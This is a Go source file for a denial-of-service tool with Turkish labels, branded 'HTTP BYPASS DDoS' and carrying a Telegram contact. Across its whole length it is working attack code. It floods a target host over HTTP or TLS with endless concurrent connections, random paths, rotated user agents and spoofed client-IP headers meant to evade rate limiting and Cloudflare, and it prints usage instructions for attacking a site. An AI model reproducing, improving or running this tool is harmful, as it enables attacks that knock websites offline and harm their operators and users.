package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	hedefUrl     string
	threadSayisi int
	aktif        bool = true
	sayac        int64
	mutex        sync.Mutex
	wg           sync.WaitGroup
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
	"Mozilla/5.0 (Android 14; Mobile) AppleWebKit/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
}

func rastgeleIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(255-1)+1,
		rand.Intn(255-1)+1,
		rand.Intn(255-1)+1,
		rand.Intn(255-1)+1,
	)
}

func rastgelePath() string {
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	length := rand.Intn(10) + 5
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

func httpBypass(hedef string, port string, isSSL bool) {
	defer wg.Done()

	host := hedef
	if strings.Contains(hedef, ":") {
		host = strings.Split(hedef, ":")[0]
	}

	fakeIP := rastgeleIP()
	ua := userAgents[rand.Intn(len(userAgents))]
	path := rastgelePath()

	var conn net.Conn
	var err error

	if isSSL {
		cfg := &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
		}
		conn, err = tls.Dial("tcp", hedef+":"+port, cfg)
	} else {
		conn, err = net.Dial("tcp", hedef+":"+port)
	}

	if err != nil {
		return
	}
	defer conn.Close()

	payload := fmt.Sprintf(
		"GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
			"Accept-Language: tr-TR,tr;q=0.9,en;q=0.8\r\n"+
			"Accept-Encoding: gzip, deflate, br\r\n"+
			"Cache-Control: no-cache\r\n"+
			"Pragma: no-cache\r\n"+
			"X-Forwarded-For: %s\r\n"+
			"X-Real-IP: %s\r\n"+
			"CF-Connecting-IP: %s\r\n"+
			"X-Originating-IP: %s\r\n"+
			"X-Client-IP: %s\r\n"+
			"True-Client-IP: %s\r\n"+
			"Connection: keep-alive\r\n\r\n",
		path, hedef, ua, fakeIP, fakeIP, fakeIP, fakeIP, fakeIP, fakeIP,
	)

	for i := 0; i < 5; i++ {
		conn.Write([]byte(payload))
	}

	mutex.Lock()
	sayac += 5
	mutex.Unlock()
}

func saldiriBaslat(hedef string, port string, threadSayisi int) {
	isSSL := port == "443"

	fmt.Printf("\n[+] Hedef: %s:%s\n", hedef, port)
	fmt.Printf("[+] Thread: %d\n", threadSayisi)
	fmt.Printf("[+] SSL: %v\n", isSSL)
	fmt.Println("[+] KAPATILANA KADAR SALDIRI DEVAM EDECEK! CTRL+C ile durdur.\n")

	for i := 0; i < threadSayisi; i++ {
		wg.Add(1)
		go func() {
			for aktif {
				httpBypass(hedef, port, isSSL)
				time.Sleep(time.Microsecond * 100)
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(5 * time.Second)
		for range ticker.C {
			if !aktif {
				return
			}
			mutex.Lock()
			toplam := sayac
			mutex.Unlock()
			fmt.Printf("[+] Toplam istek: %d\n", toplam)
		}
	}()

	wg.Wait()
	fmt.Println("[+] Saldırı tamamlandı.")
}

func main() {
	rand.Seed(time.Now().UnixNano())

	fmt.Println(`
╔═══════════════════════════════════════╗
║   HTTP BYPASS DDoS - Golang (SONSUZ) ║
║   Telegram: @Zeldyy_here             ║
╚═══════════════════════════════════════╝
`)

	if len(os.Args) < 3 {
		fmt.Println("Kullanım: ./dos <hedef> <port> <thread>")
		fmt.Println("Örnek: ./dos example.com 80 2000")
		fmt.Println("Örnek: ./dos example.com 443 1000")
		os.Exit(1)
	}

	hedef := os.Args[1]
	port := os.Args[2]
	thread, _ := strconv.Atoi(os.Args[3])

	hedef = strings.ReplaceAll(hedef, "http://", "")
	hedef = strings.ReplaceAll(hedef, "https://", "")
	hedef = strings.Split(hedef, "/")[0]

	if thread < 1 {
		thread = 100
	}

	saldiriBaslat(hedef, port, thread)

	select {}
}
